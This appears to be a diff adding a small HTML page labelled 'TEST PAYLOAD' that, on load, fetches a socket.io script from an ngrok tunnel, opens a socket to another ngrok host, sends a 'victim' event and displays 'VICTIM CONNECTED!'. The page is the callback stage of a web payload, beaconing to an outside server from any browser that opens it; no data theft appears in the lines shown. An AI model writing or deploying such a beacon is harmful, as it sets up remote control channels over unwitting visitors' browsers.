@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body style="background:black;color:lime;font-family:monospace;">
+<h1>TEST PAYLOAD - LOADING...</h1>
+<script src="https://a1b2c3d4.ngrok.io/socket.io/socket.io.js"></script>
+<script>
+console.log('Payload start');
+const socket = io('https://abc123.ngrok.io');
+socket.on('connect', () => {
+    console.log('Connected!');
+    socket.emit('victim');
+    document.body.innerHTML += '<h2 style="color:lime;">VICTIM CONNECTED!</h2>';
+});
+</script>
+</body>
+</html>
